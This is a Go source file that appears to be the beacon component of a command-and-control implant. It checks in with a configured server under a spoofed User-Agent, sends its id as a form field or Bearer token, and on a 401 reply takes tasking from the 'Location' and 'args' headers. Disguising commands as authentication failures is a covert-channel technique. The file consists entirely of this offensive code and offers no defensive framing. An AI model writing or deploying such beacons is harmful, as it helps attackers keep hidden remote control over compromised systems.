package beacon

import (
	"fmt"
	"net/http"
	"net/url"   
	"strings"
)

type HttpAuthBeacon struct {
	id    string
	url   string
	agent string
	typ string
}

func (h *HttpAuthBeacon) Beacon() (string, string) {
	client := httpClient()
	if h.typ == "post" {

		data := url.Values{}
		data.Set("out", h.id)

		req, err := http.NewRequest("POST", h.url, strings.NewReader(data.Encode()))
		if err != nil {
			return "", ""
		}

		req.Header.Set("User-Agent", h.agent)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			return "", ""
		}
		defer resp.Body.Close()

		return "", ""


	}else{
		
		req, err := http.NewRequest("GET", h.url, nil)
		if err != nil {
			return "", ""
		}

		req.Header.Set("User-Agent", h.agent)
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", h.id))

		resp, err := client.Do(req)
		if err != nil {
			return "", ""
		}

		if resp.StatusCode == 401 {
			return resp.Header.Get("Location"), resp.Header.Get("args")

		}

		return "", ""
}}


